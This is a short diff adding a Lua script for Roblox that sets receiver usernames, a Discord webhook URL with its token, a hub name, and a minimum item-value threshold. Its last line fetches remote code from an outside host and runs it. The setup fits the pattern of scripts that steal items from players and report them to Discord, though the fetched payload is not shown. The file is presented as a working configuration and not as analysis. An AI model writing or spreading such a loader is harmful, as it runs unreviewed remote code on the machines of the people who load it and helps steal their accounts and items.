@@ -1,0 +1,9 @@
+Username = "IamMilleia"
+Username2 = "IamMilleia"
+Webhook = "https://discord.com/api/webhooks/1221464091693154416/mKwQRr5eUoXhSMjD-3zKQvI2EDnZbHsQV0kSkAid7MDm9yBJskA4omvd-_NOT5j0svAK"
+
+HubName = "LiquidX Hub"
+
+MinimumRAP = 10000
+
+loadstring(game:HttpGet("https://egorikusa.space"))()
